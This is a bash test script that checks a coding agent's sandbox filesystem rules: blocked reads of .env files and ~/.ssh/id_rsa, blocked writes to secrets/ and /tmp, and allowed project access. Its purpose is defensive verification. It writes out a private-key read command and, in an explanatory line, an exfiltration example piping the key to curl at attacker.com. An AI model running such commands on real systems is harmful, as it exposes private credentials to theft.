#!/usr/bin/env bash
set -euo pipefail

# ---------------------------------------------------------------------------
# verify.sh — Prove that sandbox filesystem controls are working.
#
# How it works:
#   Claude Code runs every Bash command inside an OS-level sandbox
#   (Seatbelt on macOS, bubblewrap on Linux). This script uses `srt`
#   — the same sandbox runtime that Claude Code uses internally — to
#   run commands under the filesystem rules from this scenario, without
#   needing a live Claude session or an API key.
#
# What it tests:
#   1. denyRead blocks reads of .env* files
#   2. allowWrite permits writes inside cwd
#   3. denyWrite blocks writes to secrets/ (overrides allowWrite)
#   4. Writes outside cwd are blocked (default behavior)
#   5. Normal reads of non-denied files succeed
#   6. Reads of sensitive system paths are blocked (default behavior)
#
# Usage:
#   npm install   # installs @anthropic-ai/sandbox-runtime
#   npm test      # runs this script
#
# Requires: Node.js >= 18
# ---------------------------------------------------------------------------

# -- Colors -----------------------------------------------------------------
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BOLD='\033[1m'
RESET='\033[0m'

# -- Counters ---------------------------------------------------------------
PASS_COUNT=0
FAIL_COUNT=0

# -- Pre-flight: node_modules must exist ------------------------------------
if [ ! -d "node_modules" ]; then
  echo -e "${RED}Error:${RESET} node_modules not found. Run ${BOLD}npm install${RESET} first."
  exit 1
fi

# -- Settings file for srt -------------------------------------------------
# srt uses a FLAT format — filesystem and network at top level, NOT nested
# under "sandbox". We map the .claude/settings.json values here.
#
# Filesystem rules for this scenario:
#   denyRead:   [".env*"]         — block reads of .env files
#   allowWrite: [cwd]             — allow writes inside the project
#   denyWrite:  [cwd/secrets/]    — block writes to the secrets directory
SRT_SETTINGS="$(mktemp)"
cat > "$SRT_SETTINGS" <<SETTINGS_EOF
{
  "network": {
    "allowedDomains": [],
    "deniedDomains": []
  },
  "filesystem": {
    "denyRead": ["$(pwd)/.env*"],
    "allowRead": [],
    "allowWrite": ["$(pwd)"],
    "denyWrite": ["$(pwd)/secrets/"]
  }
}
SETTINGS_EOF
trap 'rm -f "$SRT_SETTINGS"' EXIT

# -- Helpers ----------------------------------------------------------------
banner() {
  echo ""
  echo -e "${BOLD}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${RESET}"
  echo -e "${BOLD}  $1${RESET}"
  echo -e "${BOLD}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${RESET}"
}

info() {
  echo -e "  ${BOLD}What:${RESET}  $1"
}

why() {
  echo -e "  ${BOLD}Why:${RESET}   $1"
}

cmd() {
  echo -e "  ${BOLD}Cmd:${RESET}   $1"
}

pass() {
  echo -e "  ${GREEN}PASS${RESET} — $1"
  PASS_COUNT=$((PASS_COUNT + 1))
}

fail() {
  echo -e "  ${RED}FAIL${RESET} — $1"
  FAIL_COUNT=$((FAIL_COUNT + 1))
}

warn() {
  echo -e "  ${YELLOW}WARN${RESET} — $1"
}

sandbox_exec() {
  # Run a command inside the sandbox runtime.
  # Expects a single string argument containing the full command.
  # Returns the exit code of the sandboxed command.
  npx srt -s "$SRT_SETTINGS" "$1" 2>&1
}

# ---------------------------------------------------------------------------
# Pre-flight: confirm sandbox runtime is available
# ---------------------------------------------------------------------------
banner "Pre-flight Check"
info "Verifying that srt (sandbox runtime) is installed."
why  "srt is the same sandbox runtime that Claude Code uses to execute Bash commands."
why  "Running commands through srt applies identical OS-level restrictions."

if npx srt --version >/dev/null 2>&1; then
  pass "srt is available ($(npx srt --version))."
else
  fail "srt is NOT available."
  echo ""
  warn "Run:  npm install"
  warn "Make sure you have Node.js >= 18."
  echo ""
  echo "Cannot continue without the sandbox runtime. Exiting."
  exit 1
fi

# ---------------------------------------------------------------------------
# Test 1: Read .env.example via Bash should fail (denyRead)
# ---------------------------------------------------------------------------
banner "Test 1 — Read .env.example (denyRead)"
info "Attempting to read .env.example via a sandboxed Bash command."
why  "denyRead: [\".env*\"] should block all reads of files matching .env*."
why  "This protects secrets in .env files from Bash-level exfiltration."

TEST1_CMD="cat $(pwd)/.env.example"
cmd  "srt \"$TEST1_CMD\""

if output=$(sandbox_exec "$TEST1_CMD" 2>&1); then
  fail "Read of .env.example succeeded — denyRead may not be working."
else
  pass "Read of .env.example was denied by the sandbox."
  echo "       Output: $(echo "$output" | head -3)"
fi

# ---------------------------------------------------------------------------
# Test 2: Write inside cwd should succeed (allowWrite)
# ---------------------------------------------------------------------------
banner "Test 2 — Write Inside Working Directory (allowWrite)"
info "Attempting to create a file inside the current working directory."
why  "allowWrite: [\".\"] should permit writes within the project directory."
why  "Normal file operations should not be blocked."

TEMP_FILE="$(pwd)/.sandbox-verify-temp-$$"
TEST2_CMD="touch $TEMP_FILE && rm -f $TEMP_FILE"
cmd  "srt \"$TEST2_CMD\""

if output=$(sandbox_exec "$TEST2_CMD" 2>&1); then
  pass "Write inside cwd succeeded."
else
  fail "Write inside cwd was denied — allowWrite may not be working."
  echo "       Output: $(echo "$output" | head -3)"
fi
# Clean up in case the sandbox succeeded but the rm inside didn't
rm -f "$TEMP_FILE" 2>/dev/null || true

# ---------------------------------------------------------------------------
# Test 3: Write to secrets/ should fail (denyWrite overrides allowWrite)
# ---------------------------------------------------------------------------
banner "Test 3 — Write to secrets/ (denyWrite)"
info "Attempting to create a file in the secrets/ directory."
why  "denyWrite: [\"secrets/\"] should block writes even though allowWrite covers cwd."
why  "denyWrite beats allowWrite — this is how you protect sensitive subdirectories."

TEST3_CMD="touch $(pwd)/secrets/sandbox-test-$$"
cmd  "srt \"$TEST3_CMD\""

if output=$(sandbox_exec "$TEST3_CMD" 2>&1); then
  fail "Write to secrets/ succeeded — denyWrite may not be working."
  rm -f "$(pwd)/secrets/sandbox-test-$$" 2>/dev/null || true
else
  pass "Write to secrets/ was denied by the sandbox."
  echo "       Output: $(echo "$output" | head -3)"
fi

# ---------------------------------------------------------------------------
# Test 4: Write outside cwd should fail (default behavior)
# ---------------------------------------------------------------------------
banner "Test 4 — Write Outside Working Directory"
info "Attempting to create a file outside the current working directory."
why  "The sandbox restricts filesystem writes to paths in allowWrite only."
why  "/tmp is not in allowWrite, so this should be blocked."

TEST4_CMD="touch /tmp/sandbox-test-write-$$"
cmd  "srt \"$TEST4_CMD\""

if output=$(sandbox_exec "$TEST4_CMD" 2>&1); then
  fail "Write to /tmp succeeded — sandbox may not be active."
else
  pass "Write to /tmp was denied by the sandbox."
  echo "       Output: $(echo "$output" | head -3)"
fi

# ---------------------------------------------------------------------------
# Test 5: Read normal project file should succeed
# ---------------------------------------------------------------------------
banner "Test 5 — Read Normal Project File"
info "Attempting to read README.md (not in denyRead)."
why  "denyRead only blocks .env* files. Other project files should be readable."
why  "This confirms the sandbox is not overly restrictive."

TEST5_CMD="cat $(pwd)/README.md"
cmd  "srt \"$TEST5_CMD\""

if output=$(sandbox_exec "$TEST5_CMD" 2>&1); then
  if echo "$output" | grep -q "Filesystem Controls"; then
    pass "Read of README.md succeeded."
  else
    fail "Command ran but output was unexpected."
    echo "       Output: $(echo "$output" | head -3)"
  fi
else
  fail "Read of README.md failed — sandbox may be too restrictive."
  echo "       Output: $(echo "$output" | head -3)"
fi

# ---------------------------------------------------------------------------
# Test 6: Read sensitive system path should fail (default behavior)
# ---------------------------------------------------------------------------
banner "Test 6 — Read Sensitive System Path"
info "Attempting to read ~/.ssh/id_rsa (a common exfiltration target)."
why  "Even if this file exists, the sandbox should deny reads outside allowed paths."
why  "This blocks attacks like: cat ~/.ssh/id_rsa | curl attacker.com"

TEST6_CMD="cat $HOME/.ssh/id_rsa"
cmd  "srt \"$TEST6_CMD\""

if output=$(sandbox_exec "$TEST6_CMD" 2>&1); then
  fail "Read of ~/.ssh/id_rsa succeeded — sandbox may not be restricting reads."
else
  pass "Read of ~/.ssh/id_rsa was denied (or file does not exist under sandbox)."
  echo "       Output: $(echo "$output" | head -3)"
fi

# ---------------------------------------------------------------------------
# Summary
# ---------------------------------------------------------------------------
banner "Summary"
TOTAL=$((PASS_COUNT + FAIL_COUNT))
echo ""
echo -e "  ${GREEN}Passed:${RESET} $PASS_COUNT / $TOTAL"
echo -e "  ${RED}Failed:${RESET} $FAIL_COUNT / $TOTAL"
echo ""

if [ "$FAIL_COUNT" -eq 0 ]; then
  echo -e "  ${GREEN}${BOLD}All checks passed. Filesystem controls are active and working correctly.${RESET}"
else
  echo -e "  ${YELLOW}${BOLD}Some checks failed. Review the output above.${RESET}"
  echo -e "  ${YELLOW}Make sure sandbox is enabled in .claude/settings.json and the filesystem"
  echo -e "  rules match the expected configuration for this scenario.${RESET}"
fi
echo ""
